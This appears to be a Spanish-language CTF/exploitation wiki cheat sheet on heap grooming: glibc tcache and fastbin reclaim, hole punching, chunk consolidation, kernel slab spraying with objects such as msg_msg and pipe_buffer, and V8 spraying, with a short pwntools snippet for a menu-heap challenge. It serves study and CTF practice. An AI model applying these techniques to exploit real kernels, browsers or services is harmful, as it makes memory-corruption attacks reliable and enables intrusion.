# Heap grooming / feng shui (cheat sheet)

Controlar el LAYOUT del heap para que las asignaciones caigan donde te interesa. No es un bug:
es la preparacion que hace fiable a un UAF/overflow/type-confusion.

## Objetivos
- Colocar el chunk vulnerable JUSTO antes del objeto victima (para que un overflow lo pise).
- Reclamar un hueco liberado (UAF) con un objeto controlado del MISMO tamano (mismo bin).
- Evitar que metadatos del asignador o chunks no deseados se metan en medio.

## Tecnicas (userland glibc)
- Same-size reclaim: tras free(victim), pide una alloc del mismo tamano -> tcache/fastbin LIFO
  te devuelve ese mismo chunk. Rellena tcache (7 allocs) para pasar a fastbin/smallbin si hace
  falta un comportamiento distinto.
- Defragmentar: asigna muchos chunks del tamano objetivo primero para vaciar bins y forzar que
  las nuevas vengan contiguas del top.
- "Hole punching": asigna A B C, libera B, y la siguiente alloc del tamano de B cae en el hueco
  entre A y C (control de vecinos).
- Consolidacion: libera chunks adyacentes para que se fusionen (unsorted) y luego trocea, para
  crear overlaps controlados.

## Spraying (kernel y navegador)
- Kernel: rellenar un slab (kmalloc-N) con muchos objetos del tamano objetivo para que el UAF
  reclame uno tuyo. Objetos "elasticos": msg_msg (msgsnd), setxattr (+userfaultfd para tiempo),
  sk_buff, pipe_buffer. Ver [[race-conditions]] y [[kernel-pwn]].
- Navegador/V8: crear muchos arrays/objetos del mismo shape para agrupar allocations y situar
  el objeto victima de forma predecible; ver [[browser-v8]].

## Reglas practicas
1. Conoce el tamano exacto del objeto victima (define el bin/slab).
2. Vacia/llena el bin correspondiente antes de disparar el bug.
3. Minimiza el "ruido" (allocs internas de la libc/printf) durante la fase critica.
4. Verifica el layout en un debugger (pwndbg `heap`, `vis_heap_chunks`) antes de disparar.

## Ejemplo pwntools: reclaim (UAF) y hole punching
```python
from pwn import *
# Primitivas tipicas de un menu-heap CTF:
def alloc(i, sz, data=b""):  # crea chunk i de tamano sz
    io.sendlineafter(b"> ", b"1"); io.sendlineafter(b"idx: ", str(i).encode())
    io.sendlineafter(b"size: ", str(sz).encode()); io.sendafter(b"data: ", data)
def free(i):
    io.sendlineafter(b"> ", b"2"); io.sendlineafter(b"idx: ", str(i).encode())

# 1) Same-size reclaim (UAF): recupera el chunk liberado con un objeto controlado.
#    tcache/fastbin es LIFO -> el proximo alloc del MISMO size devuelve ese chunk.
alloc(0, 0x48)                     # victima
free(0)                            # queda un UAF: el prog sigue usando idx 0
alloc(1, 0x48, p64(target)*4)      # reclama el mismo chunk -> pisa el objeto que sigue vivo

# 2) Vaciar tcache para bajar a fastbin/unsorted (7 slots por size en tcache).
for i in range(7): alloc(10+i, 0x48)
for i in range(7): free(10+i)      # llena tcache[0x50]; el 8º free ira a fastbin/unsorted

# 3) Hole punching: A B C, libera B, la siguiente alloc de |B| cae entre A y C.
alloc(0, 0x28); alloc(1, 0x28); alloc(2, 0x28)   # A B C contiguos
free(1)                                          # hueco donde estaba B
alloc(3, 0x28, b"OWN")                           # cae en el hueco: vecino de A y C

# 4) Consolidacion: libera adyacentes para fusionar en unsorted y luego trocear (overlap).
#    Deja SIEMPRE un chunk "guardia" antes del top para que free no consolide con el top.
```
Regla de oro: reproduce el layout en pwndbg (`vis_heap_chunks`) tras cada paso antes de
disparar el bug; el groom fiable es el que ves, no el que supones. Ver [[modern-heap]] y
[[uaf-typeconfusion]].
